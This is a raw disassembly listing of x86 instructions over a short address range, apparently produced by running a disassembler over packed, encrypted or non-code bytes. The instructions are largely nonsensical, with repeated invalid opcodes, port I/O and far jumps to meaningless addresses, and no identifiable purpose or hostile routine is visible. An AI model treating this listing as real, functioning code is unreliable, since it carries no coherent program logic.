  40bed4:	sub    eax,0xc476e7b1
  40bed9:	jno    0x40bef4
  40bedb:	mov    al,ds:0xd60b60b5
  40bee0:	pusha  
  40bee1:	mov    ah,0xd7
  40bee3:	ins    DWORD PTR es:[edi],dx
  40bee4:	push   eax
  40bee5:	adc    al,0x16
  40bee7:	addr16 push ebx
  40bee9:	jl     0x40bed4
  40beeb:	pop    ebp
  40beec:	bnd call 0x47550ddc
  40bef2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bef3:	ins    BYTE PTR es:[edi],dx
  40bef4:	mov    edx,0xdc3ada1e
  40bef9:	sbb    al,0xcf
  40befb:	mov    bh,0xbc
  40befd:	dec    esi
  40befe:	(bad)  
  40beff:	enter  0x52f8,0xba
  40bf03:	fsubr  DWORD PTR [edx-0x24]
  40bf06:	and    ecx,DWORD PTR [esi]
  40bf08:	repnz rcl BYTE PTR [ebp-0x5039302e],1
  40bf0f:	test   al,0x98
  40bf11:	inc    ebp
  40bf12:	je     0x40bebc
  40bf14:	push   ebx
  40bf15:	js     0x40bf0f
  40bf17:	mov    dl,ch
  40bf19:	out    0x26,eax
  40bf1b:	cmp    al,0xbc
  40bf1d:	(bad)  
  40bf1e:	fst    st(2)
  40bf20:	or     BYTE PTR [esi-0x270d311],bh
  40bf26:	adc    cl,bh
  40bf28:	pop    ecx
  40bf29:	xor    esp,0xffffff97
  40bf2c:	cwde   
  40bf2d:	in     eax,dx
  40bf2e:	dec    DWORD PTR [ebx+0x20]
  40bf31:	adc    ebx,edx
  40bf33:	push   esp
  40bf34:	dec    ecx
  40bf35:	das    
  40bf36:	in     al,0xbc
  40bf38:	xor    dl,BYTE PTR [edi-0x4ba8c15b]
  40bf3e:	mov    ?,WORD PTR [esi+ebp*4+0x7a2d68cc]
  40bf45:	cmp    ebx,DWORD PTR [edx-0x58]
  40bf48:	jmp    0x40bf1d
  40bf4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf4b:	mov    DWORD PTR [edx],ebp
  40bf4d:	test   eax,0x6369b02f
  40bf52:	mov    ds:0xc0ae01f3,eax
  40bf57:	test   DWORD PTR [eax-0x43],edx
  40bf5a:	out    0xcb,eax
  40bf5c:	inc    esp
  40bf5d:	inc    eax
  40bf5e:	add    esi,esp
  40bf60:	retf   
  40bf61:	ja     0x40bf18
  40bf63:	add    eax,0xcab949b
  40bf68:	xchg   BYTE PTR [eax],bh
  40bf6a:	scas   eax,DWORD PTR es:[edi]
  40bf6b:	cmp    al,0xe1
  40bf6d:	out    0xd2,al
  40bf6f:	push   esp
  40bf70:	pop    edi
  40bf71:	lods   al,BYTE PTR ds:[esi]
  40bf72:	push   esi
  40bf73:	inc    edi
  40bf74:	out    dx,eax
  40bf75:	data16 mov dl,0xc3
  40bf78:	cdq    
  40bf79:	xor    dl,cl
  40bf7b:	mov    dl,0xda
  40bf7d:	out    dx,al
  40bf7e:	scas   eax,DWORD PTR es:[edi]
  40bf7f:	gs or  eax,0xfba36f22
  40bf85:	jmp    0x7941:0x6a25ecc0
  40bf8c:	neg    BYTE PTR [edi-0x24]
  40bf8f:	lea    ebp,[edi-0x79342749]
  40bf95:	pop    es
  40bf96:	sbb    eax,0x42366b88
  40bf9b:	cmc    
  40bf9c:	scas   eax,DWORD PTR es:[edi]
  40bf9d:	aam    0x2e
  40bf9f:	mov    eax,0xce673b0b
  40bfa4:	fcmovu st,st(5)
  40bfa6:	scas   eax,DWORD PTR es:[edi]
  40bfa7:	jb     0x40bfda
  40bfa9:	jae    0x40c019
  40bfab:	ja     0x40c008
  40bfad:	aaa    
  40bfae:	cmp    al,0xb5
  40bfb0:	out    dx,eax
  40bfb1:	enter  0x6670,0xf1
  40bfb5:	std    
  40bfb6:	sbb    al,0xa2
  40bfb8:	fcmovnbe st,st(6)
  40bfba:	lods   al,BYTE PTR ds:[esi]
  40bfbb:	mov    BYTE PTR [ebp+ebx*2+0x19],dl
  40bfbf:	rcl    dl,0x8
  40bfc2:	ret    0xb1d3
  40bfc5:	ret    0x1aac
  40bfc8:	jl     0x40bfcb
  40bfca:	cwde   
  40bfcb:	add    al,BYTE PTR [ebx]
  40bfcd:	fild   WORD PTR [esi+ebx*4-0x2c1a6475]
  40bfd4:	jmp    0x40c019
  40bfd6:	(bad)  
  40bfd7:	sahf   
  40bfd8:	je     0x40bfed
  40bfda:	xor    eax,0x7be9bc01
  40bfdf:	test   al,0x5f
  40bfe1:	imul   esp,edx,0x2d
  40bfe4:	int3   
  40bfe5:	xchg   edx,eax
  40bfe6:	imul   edi,DWORD PTR [ebp-0x73e929de],0xffffffb0
  40bfed:	popa   
  40bfee:	cdq    
  40bfef:	pop    ss
  40bff0:	out    0xb,eax
  40bff2:	mov    ecx,0xe7df1895
  40bff7:	mov    ah,0x4b
  40bff9:	mov    eax,0xb1cda0b5
  40bffe:	popf   
  40bfff:	out    dx,eax
  40c000:	sub    eax,0x2823e301
  40c005:	lock adc DWORD PTR [eax-0x40],ebx
  40c009:	loop   0x40bff9
  40c00b:	cmp    BYTE PTR [eax-0x2],dh
  40c00e:	mov    eax,ds:0xdb514315
  40c013:	fmul   QWORD PTR [edi+ebp*1]
  40c016:	adc    eax,0x38867c5c
  40c01b:	inc    ebp
  40c01c:	int    0x48
  40c01e:	nop
  40c01f:	mov    bh,BYTE PTR gs:[edx-0x71]
  40c023:	adc    al,ah
  40c025:	test   eax,0x470a071c
  40c02a:	xchg   esi,eax
  40c02b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c02c:	mov    al,ds:0x5e6c1c63
  40c031:	lds    ebx,FWORD PTR [edi]
  40c033:	cmp    BYTE PTR [edi+0x41652543],0xf4
  40c03a:	imul   esi,eax,0x2c8aa112
  40c040:	jo     0x40c071
  40c042:	cmp    DWORD PTR [edx],ebx
  40c044:	mov    ch,0xc4
  40c046:	in     al,0x23
  40c048:	dec    ebx
  40c049:	push   esp
  40c04a:	leave  
  40c04b:	outs   dx,DWORD PTR ds:[esi]
  40c04c:	add    eax,0xafc31669
  40c051:	xchg   ecx,eax
  40c052:	outs   dx,BYTE PTR ds:[esi]
  40c053:	push   esi
  40c054:	shl    BYTE PTR [edi-0x12472cd1],1
  40c05a:	test   eax,0x693f1d27
  40c05f:	out    0x44,al
  40c061:	(bad)  
  40c062:	mov    ecx,0x5e090447
  40c067:	outs   dx,DWORD PTR ds:[esi]
  40c068:	or     eax,0x7f5d1c9d
  40c06d:	jmp    0xc37c:0x85de6be9
  40c074:	pop    ebp
  40c075:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c076:	or     dl,BYTE PTR [edx+0x35]
  40c079:	into   
  40c07a:	std    
  40c07b:	add    bh,BYTE PTR [edx]
  40c07d:	fiadd  WORD PTR [ecx+0x16]
  40c080:	xchg   DWORD PTR [eax],ebx
  40c082:	cli    
  40c083:	repz enter 0x22,0xc2
  40c088:	sahf   
  40c089:	push   eax
  40c08a:	and    al,0xd1
  40c08c:	adc    al,0x4c
  40c08e:	fwait
  40c08f:	mov    al,ds:0x60b439e6
  40c094:	imul   eax,DWORD PTR [edx+esi*4],0xffffffd1
  40c098:	dec    ebp
  40c099:	adc    al,0x10
  40c09b:	dec    edi
  40c09c:	or     DWORD PTR [edi+0x257d7ee7],eax
  40c0a2:	and    bl,BYTE PTR [ebp-0x64fbf535]
  40c0a8:	hlt    
  40c0a9:	dec    ebx
  40c0aa:	and    BYTE PTR [eax+0x2f5495e0],al
  40c0b0:	int    0x3
  40c0b2:	cmc    
  40c0b3:	rol    DWORD PTR [ecx+0x3a16ab91],1
  40c0b9:	add    eax,0xa0d41d0
  40c0bf:	sar    BYTE PTR [ebp+0x4bc64a99],1
  40c0c5:	push   ebp
  40c0c6:	jge    0x40c0b0
  40c0c8:	dec    eax
  40c0c9:	xchg   esi,eax
  40c0ca:	test   al,0x81
  40c0cc:	inc    ebx
  40c0cd:	inc    ebx
  40c0ce:	outs   dx,DWORD PTR ds:[esi]
  40c0cf:	inc    eax
  40c0d0:	and    al,0xf4
  40c0d2:	jecxz  0x40c0a6
  40c0d4:	jp     0x40c0bf
  40c0d6:	iret   
  40c0d7:	push   eax
  40c0d8:	popf   
  40c0d9:	xor    eax,0x4049f878
  40c0de:	rcr    BYTE PTR [ecx+0x3c],0x7f
  40c0e2:	push   esi
  40c0e3:	cdq    
  40c0e4:	jge    0x40c083
  40c0e6:	ror    DWORD PTR [esi],1
  40c0e8:	les    esi,FWORD PTR [eax-0x42]
  40c0eb:	cwde   
  40c0ec:	js     0x40c0aa
  40c0ee:	dec    eax
  40c0ef:	xor    al,0xbe
  40c0f1:	mov    BYTE PTR [eax+0xb],ch
  40c0f4:	cmp    DWORD PTR [edi+0xe3dd1bf],esi
  40c0fa:	(bad)  
  40c0fc:	push   cs
  40c0fd:	jg     0x40c122
  40c0ff:	and    esi,edi
  40c101:	dec    ecx
  40c102:	mov    ah,0xd8
  40c104:	mov    cl,0x2
  40c106:	xchg   edi,eax
  40c107:	inc    ecx
  40c108:	pop    esp
  40c109:	hlt    
  40c10a:	cmp    cl,BYTE PTR [esi]
  40c10c:	sahf   
  40c10d:	jg     0x40c09d
  40c10f:	repnz scas eax,DWORD PTR es:[edi]
  40c111:	pop    eax
  40c112:	pop    es
  40c113:	out    0xec,eax
  40c115:	(bad)  
  40c116:	push   ss
  40c117:	xor    edi,ecx
  40c119:	dec    edx
  40c11a:	jae    0x40c150
  40c11c:	dec    ecx
  40c11d:	in     al,dx
  40c11e:	mov    BYTE PTR [esi],bh
  40c120:	mov    esp,0x81ed2b
  40c125:	add    esp,edi
  40c127:	out    0x91,eax
  40c129:	xor    eax,0xb10bbaae
  40c12e:	out    0xb3,al
  40c130:	mov    dl,bl
  40c132:	cs repz xchg ecx,eax
  40c135:	lahf   
  40c136:	cli    
  40c137:	in     al,dx
  40c138:	inc    ebx
  40c139:	sub    BYTE PTR [eax-0x7d],cl
  40c13c:	lahf   
  40c13d:	inc    ebx
  40c13e:	sub    al,0x65
  40c140:	iret   
  40c141:	or     eax,0xf5a02562
  40c146:	div    ah
  40c148:	mov    eax,0x3f8a1ea8
  40c14d:	sbb    al,0x7e
  40c14f:	adc    eax,0x8ee6f61c
  40c154:	push   edi
  40c155:	xlat   BYTE PTR fs:[ebx]
  40c157:	dec    esi
  40c158:	xor    al,BYTE PTR [esi]
  40c15a:	mov    edx,0x8d64a7c4
  40c15f:	xchg   ebp,eax
  40c160:	jge    0x40c1c3
  40c162:	xor    BYTE PTR [edi+0x57],bh
  40c165:	outs   dx,DWORD PTR ds:[esi]
  40c166:	jno    0x40c108
  40c168:	xor    BYTE PTR gs:[edx*2+0x3d911ba2],dl
  40c170:	out    dx,eax
  40c171:	pop    edx
  40c172:	shl    esi,cl
  40c174:	adc    BYTE PTR [ecx],bl
  40c176:	pop    ebp
  40c177:	cmp    dh,0x5f
  40c17a:	and    al,0xc5
  40c17c:	mov    ds:0xe09b28d0,eax
  40c181:	pop    ecx
  40c182:	std    
  40c183:	xor    eax,0xef7e4434
  40c188:	adc    bh,BYTE PTR [ecx]
  40c18a:	inc    ecx
  40c18b:	cmp    DWORD PTR [ebp+eax*1-0x352bf77d],esi
  40c192:	shl    BYTE PTR [esi],cl
  40c194:	aad    0xf7
  40c196:	inc    edi
  40c197:	dec    ebx
  40c198:	imul   ebp,DWORD PTR [edx],0x8
  40c19b:	mov    ch,BYTE PTR [eax-0x3a242ac6]
  40c1a1:	icebp  
  40c1a2:	sbb    dh,BYTE PTR [ebp+0xc00d567]
  40c1a8:	scas   al,BYTE PTR es:[edi]
  40c1a9:	mov    ebx,0x4b1a18e5
  40c1ae:	scas   al,BYTE PTR es:[edi]
  40c1af:	ds out 0xbd,eax
  40c1b2:	call   0x46b615a9
  40c1b7:	mov    WORD PTR [edi],es
  40c1b9:	jmp    0x81b:0xd13e6c13
  40c1c0:	cwde   
  40c1c1:	jbe    0x40c216
  40c1c3:	outs   dx,DWORD PTR ds:[esi]
  40c1c4:	fcmovnb st,st(0)
  40c1c6:	push   edx
  40c1c7:	pop    esi
  40c1c8:	call   0x2433:0xb2b0a0f8
  40c1cf:	push   esi
  40c1d0:	sub    bh,BYTE PTR [edx]
  40c1d2:	sbb    BYTE PTR [ecx-0x67f0d9dc],dh
  40c1d8:	(bad)  
  40c1da:	adc    BYTE PTR [esi-0x3e4f3cda],ah
  40c1e0:	mov    ebx,DWORD PTR [esi+0xf]
  40c1e3:	mov    bh,al
  40c1e5:	or     BYTE PTR es:[edi],bl
  40c1e8:	ror    ebx,cl
  40c1ea:	pusha  
  40c1eb:	dec    ecx
  40c1ec:	in     eax,0xc2
  40c1ee:	mov    ebp,0x62b925e2
  40c1f3:	jo     0x40c1ce
  40c1f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1f6:	xchg   edx,eax
  40c1f7:	cmc    
  40c1f8:	pop    esi
  40c1f9:	xchg   BYTE PTR [edx+eax*1+0x306887],ch
  40c200:	push   esp
  40c201:	mov    ecx,DWORD PTR [esi+eax*8]
  40c204:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c205:	mov    eax,0x68bd1e13
  40c20a:	icebp  
  40c20b:	dec    ebp
  40c20c:	xor    DWORD PTR ss:[ecx+0x3a],0xffffffbe
  40c211:	cdq    
  40c212:	inc    edi
  40c213:	dec    esp
  40c214:	out    0x86,eax
  40c216:	inc    ebp
  40c217:	std    
  40c218:	pop    es
  40c219:	in     al,dx
  40c21a:	cmp    ebx,ecx
  40c21c:	xlat   BYTE PTR ds:[ebx]
  40c21d:	inc    edx
  40c21e:	jnp    0x40c1a1
  40c220:	js     0x40c1c3
  40c222:	xchg   esi,eax
  40c223:	push   esp
  40c224:	inc    ecx
  40c225:	pop    es
  40c226:	dec    ebp
  40c227:	sbb    eax,0xda28ed23
  40c22c:	mov    eax,0x279269fc
  40c231:	pop    ebp
  40c232:	jmp    0xeffc95b1
  40c237:	int3   
  40c238:	jmp    0x40c246
  40c23a:	inc    ecx
  40c23b:	jl     0x40c1d7
  40c23d:	mul    BYTE PTR [ebp+0x727a0fa7]
  40c243:	cmp    eax,0x7de8a86f
  40c248:	jno    0x40c24e
  40c24a:	cmp    dl,BYTE PTR [esi]
  40c24c:	inc    esp
  40c24d:	pop    esp
  40c24e:	push   edi
  40c24f:	popa   
  40c250:	fs push 0x9
  40c253:	out    0xbb,al
  40c255:	xchg   ebx,eax
  40c256:	and    BYTE PTR [edi-0x689928c4],0x74
  40c25d:	mov    ebx,0x78614d6f
  40c262:	sbb    bl,BYTE PTR [ebx]
  40c264:	jns    0x40c2da
  40c266:	cmp    al,0xf3
  40c268:	xor    eax,0x3dc82e0d
  40c26d:	loop   0x40c1fc
  40c26f:	xchg   esp,eax
  40c270:	sub    eax,0xd0ff81e6
  40c275:	out    dx,al
  40c276:	shl    DWORD PTR [eax],cl
  40c278:	mov    cl,0xc6
  40c27a:	lods   eax,DWORD PTR ds:[esi]
  40c27b:	adc    DWORD PTR [esi-0x847ecb7],ebx
  40c281:	xchg   ebp,eax
  40c282:	mov    dl,0xaa
  40c284:	adc    al,0x47
  40c286:	out    0xde,eax
  40c288:	adc    esi,DWORD PTR [edi+0x1703de0f]
  40c28e:	pushf  
  40c28f:	fwait
  40c290:	and    ch,bl
  40c292:	push   esp
  40c293:	mov    cl,0xcd
  40c295:	cs dec esp
  40c297:	fwait
  40c298:	dec    edx
  40c299:	adc    esp,ebp
  40c29b:	rol    DWORD PTR [esi],0xee
  40c29e:	pop    ss
  40c29f:	add    BYTE PTR [ebx-0x5d1afa6],0x5e
  40c2a6:	das    
  40c2a7:	sar    BYTE PTR [ecx-0x21],1
  40c2aa:	(bad)  
  40c2ab:	pop    edi
  40c2ac:	jnp    0x40c282
  40c2ae:	push   0x97d01a00
  40c2b3:	adc    eax,0xbb259f5c
  40c2b8:	loope  0x40c2da
  40c2ba:	shl    dl,1
  40c2bc:	ja     0x40c321
  40c2be:	sahf   
  40c2bf:	not    DWORD PTR [ecx-0x5a]
  40c2c2:	mov    bh,0xc9
  40c2c4:	sti    
  40c2c5:	xchg   ebx,eax
  40c2c6:	in     al,dx
  40c2c7:	mov    ds:0x41c5a499,eax
  40c2cc:	and    eax,0x47c4e4f9
  40c2d1:	pop    ebp
  40c2d2:	sub    edi,DWORD PTR [eax]
  40c2d4:	(bad)  
  40c2d5:	fwait
  40c2d6:	adc    ah,0xd1
  40c2d9:	and    bl,BYTE PTR [esi+0x19b980a9]
  40c2df:	add    DWORD PTR [ecx+0x51],ecx
  40c2e2:	or     DWORD PTR [ebx+eax*4],ebp
  40c2e5:	ficomp WORD PTR [ebp-0x2831c760]
  40c2eb:	adc    eax,0x7d7c0d71
  40c2f0:	xchg   ebx,eax
  40c2f1:	or     esp,edx
  40c2f3:	repnz cdq 
  40c2f5:	mov    dh,0xdb
  40c2f7:	adc    dl,BYTE PTR [esi-0x56]
  40c2fa:	ficomp WORD PTR [edx+0x1e]
  40c2fd:	fstp   TBYTE PTR [eax]
  40c2ff:	pop    esp
  40c300:	ffree  st(1)
  40c302:	fisubr WORD PTR [ebp+0x136e57d0]
  40c308:	pop    es
  40c309:	dec    edi
  40c30a:	jl     0x40c353
  40c30c:	xor    al,0xa2
  40c30e:	out    0xad,eax
  40c310:	ret    
  40c311:	test   DWORD PTR es:[eax-0x63],ecx
  40c315:	mov    ecx,cs
  40c317:	xlat   BYTE PTR ds:[ebx]
  40c318:	fcom   DWORD PTR [esi-0x43b02eb3]
  40c31e:	aam    0xd
  40c320:	push   edi
  40c321:	imul   eax,esi,0xffffff93
  40c324:	mov    edx,0xa7c83085
  40c329:	(bad)  [ebx]
  40c32b:	stc    
  40c32c:	out    0xad,eax
  40c32e:	icebp  
  40c32f:	or     al,0x68
  40c332:	cmp    eax,0x27b042df
  40c337:	popa   
  40c338:	inc    ebp
  40c339:	and    dl,BYTE PTR [esi+ebx*8+0x2222635c]
  40c340:	cmp    BYTE PTR [ebx],ah
  40c342:	sub    BYTE PTR [eax+edx*4-0xd],ah
  40c346:	fsubr  st,st(6)
  40c348:	mov    ebp,0x196b5919
  40c34d:	ins    BYTE PTR es:[edi],dx
  40c34e:	ds call 0xc685:0x43e21bae
  40c356:	js     0x40c34e
  40c358:	sub    al,ch
  40c35a:	dec    ecx
  40c35b:	lock mov edi,fs
  40c35e:	pop    es
  40c35f:	js     0x40c328
  40c361:	sahf   
  40c362:	xchg   DWORD PTR [eax],ebx
  40c364:	hlt    
  40c365:	mov    bl,0xd
  40c367:	sar    ebx,cl
  40c369:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c36a:	jl     0x40c3a8
  40c36c:	dec    esp
  40c36d:	test   DWORD PTR [ebx-0xea6d7f9],esp
  40c373:	je     0x40c34a
  40c375:	and    eax,0x1e6cebd
  40c37a:	in     eax,0xd4
  40c37c:	outs   dx,BYTE PTR ds:[esi]
  40c37d:	mov    bh,0xc6
  40c37f:	jge    0x40c32c
  40c381:	repz xchg ebx,eax
  40c383:	adc    al,0x1b
  40c385:	cmp    eax,0xf9f7d327
  40c38a:	add    al,0xb5
  40c38c:	(bad)  
  40c38d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c38e:	xchg   eax,eax
  40c390:	ret    0xb4d0
  40c393:	cdq    
  40c394:	aad    0xc6
  40c396:	adc    BYTE PTR [eax+0x28],al
  40c399:	fwait
  40c39a:	bound  edi,QWORD PTR [edx+0x26]
  40c39d:	cwde   
  40c39e:	inc    esi
  40c39f:	hlt    
  40c3a0:	pop    ebx
  40c3a1:	jge    0x40c3da
  40c3a3:	and    DWORD PTR [ebx+0x7c8775c9],0x47e57000
  40c3ad:	loop   0x40c3d5
  40c3af:	iret   
  40c3b0:	mul    BYTE PTR [esi+0x2c]
  40c3b3:	sbb    al,ch
  40c3b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3b6:	inc    ebx
  40c3b7:	jl     0x40c39b
  40c3b9:	cli    
  40c3ba:	add    ch,cl
  40c3bc:	(bad)  
  40c3bd:	leave  
  40c3be:	sbb    ch,BYTE PTR [esi+0x21]
  40c3c1:	dec    ecx
  40c3c2:	jmp    FWORD PTR ds:0x4cac85e1
  40c3c8:	mov    ecx,0x8a8dc47a
  40c3cd:	or     eax,0xb3c5d373
  40c3d2:	daa    
  40c3d3:	je     0x40c447
  40c3d5:	clc    
  40c3d6:	lods   al,BYTE PTR ds:[esi]
  40c3d7:	jmp    0x40c3bf
  40c3d9:	jp     0x40c3e8
  40c3db:	pop    ebx
  40c3dc:	mov    cl,0x99
  40c3de:	mov    ch,BYTE PTR [edx-0x6a0100a6]
  40c3e4:	jb     0x40c410
  40c3e6:	cmp    bh,BYTE PTR [ecx-0x5f]
  40c3e9:	int3   
  40c3ea:	cli    
  40c3eb:	xor    ecx,ebx
  40c3ed:	add    BYTE PTR [ebx+edx*4+0x2a],bl
  40c3f1:	xor    al,ah
  40c3f3:	sub    DWORD PTR [ebp+0x2769d3f7],ebp
  40c3f9:	push   0x671a5cf7
  40c3fe:	push   esi
  40c3ff:	mov    ch,0xe7
  40c401:	xlat   BYTE PTR ds:[ebx]
  40c402:	xchg   DWORD PTR [edi-0x367d42c6],edi
  40c408:	ret    0xcfdf
  40c40b:	sti    
  40c40c:	xlat   BYTE PTR ds:[ebx]
  40c40d:	aas    
  40c40e:	inc    edx
  40c40f:	and    BYTE PTR [esi],al
  40c411:	mov    DWORD PTR [edx+ecx*2+0x2c],0x3391f4a0
  40c419:	mov    cl,0x44
  40c41b:	push   es
  40c41c:	cmp    DWORD PTR [esi+0x5d],0x14311c62
  40c423:	aam    0x14
  40c425:	push   ecx
  40c426:	jo     0x40c3fd
  40c428:	xor    BYTE PTR [ebx+0x15],dl
  40c42b:	adc    DWORD PTR [edi-0x3d],ebx
  40c42e:	mov    ebx,0xcbf5ea32
  40c433:	sbb    al,0x39
  40c436:	mov    al,ds:0xe231cd8e
  40c43b:	sbb    ch,dh
  40c43d:	mov    ch,0x20
  40c43f:	xor    ch,BYTE PTR [edx-0x57b2170c]
  40c445:	ss ss cli 
  40c448:	jne    0x40c4ba
  40c44a:	std    
  40c44b:	dec    edi
  40c44c:	adc    BYTE PTR [eax+0x6d],ah
  40c44f:	out    dx,eax
  40c450:	int    0xd9
  40c452:	fwait
  40c453:	ins    DWORD PTR es:[edi],dx
  40c454:	inc    ebx
  40c455:	add    dh,BYTE PTR [eax+0x46]
  40c458:	adc    eax,0x63a96c11
  40c45d:	sub    esp,DWORD PTR [edx-0x489c4fc9]
  40c463:	cmp    edx,edi
  40c465:	pop    eax
  40c466:	cmc    
  40c467:	xchg   ebp,eax
  40c468:	push   ecx
  40c469:	out    0x1a,eax
  40c46b:	out    0x47,eax
  40c46d:	inc    ebp
  40c46e:	mov    edx,0x7da65003
  40c473:	jnp    0x40c480
  40c475:	pushf  
  40c476:	pop    edx
  40c477:	outs   dx,BYTE PTR ds:[esi]
  40c478:	data16 test BYTE PTR ss:[esi],al
  40c47c:	fisub  DWORD PTR [ebx-0x4c2aabc0]
  40c482:	call   0x1d09:0x50f78e61
  40c489:	fidivr WORD PTR [esp+ebp*2-0x26]
  40c48d:	imul   edx,eax,0x97aaeb5e
  40c493:	pop    ebp
  40c494:	rol    esp,1
  40c496:	inc    ebx
  40c497:	outs   dx,BYTE PTR ds:[esi]
  40c498:	mov    edx,0xc8b44806
  40c49d:	mov    ecx,0x3ac71fca
  40c4a2:	cmp    BYTE PTR [ebp-0x1352f547],dh
  40c4a8:	mov    eax,0x81956664
  40c4ad:	add    bl,BYTE PTR [edi-0x37]
  40c4b0:	pop    ds
  40c4b1:	push   ds
  40c4b2:	cld    
  40c4b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4b4:	ret    
  40c4b5:	push   0x22874726
  40c4ba:	stos   DWORD PTR es:[edi],eax
  40c4bb:	pop    edi
  40c4bc:	push   ss
  40c4bd:	mov    edx,0x10bd95f2
  40c4c2:	fidiv  DWORD PTR [ebp+0x43fe81f9]
  40c4c8:	sbb    BYTE PTR [ecx+eax*1],0x2c
  40c4cc:	xchg   ecx,eax
  40c4cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4ce:	fisttp QWORD PTR es:0x6f9ace5c
  40c4d5:	popf   
  40c4d6:	nop
  40c4d7:	dec    eax
  40c4d8:	repnz imul edi,DWORD PTR [ebx+eax*8-0x5570c270],0xfdfff77e
  40c4e4:	gs iret 
  40c4e6:	scas   eax,DWORD PTR es:[edi]
  40c4e7:	fsubr  st(5),st
  40c4e9:	adc    BYTE PTR [ebp+0x7b0a02c4],bh
  40c4ef:	adc    DWORD PTR [eax-0x7a],ebp
  40c4f2:	retf   
  40c4f3:	xchg   edi,eax
  40c4f4:	xchg   ecx,eax
  40c4f5:	int3   
  40c4f6:	ins    DWORD PTR es:[edi],dx
  40c4f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4f8:	push   cs
  40c4f9:	jecxz  0x40c51d
  40c4fb:	hlt    
  40c4fc:	and    eax,0x2db4cf82
  40c501:	out    dx,eax
  40c502:	sbb    DWORD PTR [edx+0x78],edx
  40c505:	mov    ds:0xeeb792c,al
  40c50a:	or     DWORD PTR [ebx+0x3],esi
  40c50d:	repz inc esp
  40c50f:	ins    DWORD PTR es:[edi],dx
  40c510:	into   
  40c511:	jo     0x40c4c3
  40c513:	push   ecx
  40c514:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c515:	and    ch,BYTE PTR [ebx+0x32b2dac4]
  40c51b:	jp     0x40c50d
  40c51d:	and    eax,0x63c00793
  40c522:	push   esp
  40c523:	push   DWORD PTR [eax]
  40c525:	je     0x40c58a
  40c527:	and    bl,dl
  40c529:	(bad)  
  40c52a:	neg    ch
  40c52c:	or     edx,ebx
  40c52e:	hlt    
  40c52f:	push   es
  40c530:	xchg   edi,eax
  40c531:	out    dx,eax
  40c532:	mov    cl,0xe9
  40c534:	sub    ah,bh
  40c536:	mov    ah,BYTE PTR [edx+0x31]
  40c539:	repnz or ebx,DWORD PTR [edi]
  40c53c:	int    0xf5
  40c53e:	mov    bl,0x6d
  40c540:	shl    BYTE PTR [esp+edi*8],cl
  40c543:	add    eax,0x76e29ccc
  40c548:	mov    esi,0x14c97eea
  40c54d:	inc    edx
  40c54e:	mov    bh,0xf3
  40c550:	pop    ebp
  40c551:	inc    esi
  40c552:	adc    ah,BYTE PTR [edx-0x7a826741]
  40c558:	pop    esi
  40c559:	clc    
  40c55a:	jmp    0x346af9d3
  40c55f:	lods   eax,DWORD PTR ds:[esi]
  40c560:	jle    0x40c549
  40c562:	pop    ecx
  40c563:	push   edi
  40c564:	jb     0x40c501
  40c566:	jp     0x40c510
  40c568:	jg     0x40c53d
  40c56a:	das    
  40c56b:	pop    edx
  40c56c:	mov    ds:0xb776898c,eax
  40c571:	lods   al,BYTE PTR ds:[esi]
  40c572:	sti    
  40c573:	shr    BYTE PTR [esi-0x32],1
  40c576:	clc    
  40c577:	dec    edi
  40c578:	add    BYTE PTR [ebx],dl
  40c57a:	out    dx,eax
  40c57b:	add    BYTE PTR [esi-0x6b],cl
  40c57e:	jmp    0xb37fa997
  40c583:	test   al,0xc9
  40c585:	jnp    0x40c606
  40c587:	scas   eax,DWORD PTR es:[edi]
  40c588:	push   ebx
  40c589:	imul   esp,DWORD PTR [ebx-0x6f],0x541683ab
  40c590:	(bad)  
  40c591:	iret   
  40c592:	jmp    0x40c55d
  40c594:	out    dx,al
  40c595:	cmp    BYTE PTR [edi],dl
  40c597:	es mov esp,0x7b0caa8b
  40c59d:	outs   dx,BYTE PTR ds:[esi]
  40c59e:	mov    al,BYTE PTR [edx]
  40c5a0:	jb     0x40c607
  40c5a2:	or     DWORD PTR [edx+ebx*1],esp
  40c5a5:	add    edx,edx
  40c5a7:	repz icebp 
  40c5a9:	sub    BYTE PTR [ebp+0x54],cl
  40c5ac:	gs scas eax,DWORD PTR es:[edi]
  40c5ae:	lods   eax,DWORD PTR ds:[esi]
  40c5af:	xchg   DWORD PTR [ebx+0xdfe803],eax
  40c5b5:	and    BYTE PTR [edx-0x26],bl
  40c5b8:	popf   
  40c5b9:	mov    edi,0x9cd2d6f8
  40c5be:	data16 jno 0x40c544
  40c5c1:	es retf 0x9425
  40c5c5:	sbb    eax,0x6b74d38c
  40c5ca:	(bad)  
  40c5cb:	stos   BYTE PTR es:[edi],al
  40c5cc:	inc    edi
  40c5cd:	test   ecx,0xc640ca95
  40c5d3:	jo     0x40c5f7
  40c5d5:	les    ebx,FWORD PTR [ebx+0x2d6ad59e]
  40c5db:	push   0xe8de9cc5
  40c5e0:	mov    al,ds:0x4878f363
  40c5e5:	fwait
  40c5e6:	or     BYTE PTR [edi+ebx*2-0x51],ch
  40c5ea:	pop    es
  40c5eb:	out    dx,eax
  40c5ec:	xor    edx,ebx
  40c5ee:	sub    al,0x67
  40c5f0:	loop   0x40c63a
  40c5f2:	pop    edx
  40c5f3:	ja     0x40c57a
  40c5f5:	popa   
  40c5f6:	xchg   esp,eax
  40c5f7:	mov    dh,bl
  40c5f9:	int3   
  40c5fa:	dec    esp
  40c5fb:	jno    0x40c5fa
  40c5fd:	mov    eax,0xc9dded84
  40c602:	test   al,0x98
  40c604:	xor    di,WORD PTR [ebx]
  40c607:	xlat   BYTE PTR ds:[ebx]
  40c608:	inc    ebx
  40c609:	nop
  40c60a:	push   0xfcee039d
  40c60f:	cmp    al,0x44
  40c611:	jg     0x40c658
  40c613:	sbb    ecx,eax
  40c615:	ins    DWORD PTR es:[edi],dx
  40c616:	rol    DWORD PTR [eax],1
  40c618:	nop
  40c619:	push   0xdaf3587c
